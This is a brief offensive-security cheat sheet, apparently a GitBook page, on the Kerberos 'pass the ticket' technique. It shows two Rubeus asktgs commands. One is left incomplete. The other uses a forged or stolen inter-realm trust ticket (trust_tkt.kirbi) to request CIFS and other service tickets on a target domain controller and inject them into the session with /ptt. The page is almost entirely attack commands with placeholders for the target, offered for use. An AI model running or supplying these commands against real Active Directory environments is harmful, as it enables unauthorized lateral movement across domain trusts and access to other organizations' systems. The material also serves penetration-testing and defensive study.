# Pass The Ticket

### Pass a ticket

{% code overflow="wrap" %}
```
Rubeus.exe asktgs /ticket:
```
{% endcode %}

### Use a Inter-Realm tgt

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgs /ticket:./trust_tkt.kirbi /service:cifs/<TARGET MACHINE>,<OTHER SERVICES> /dc:<TARGET DOMAIN DC> /ptt
```
{% endcode %}
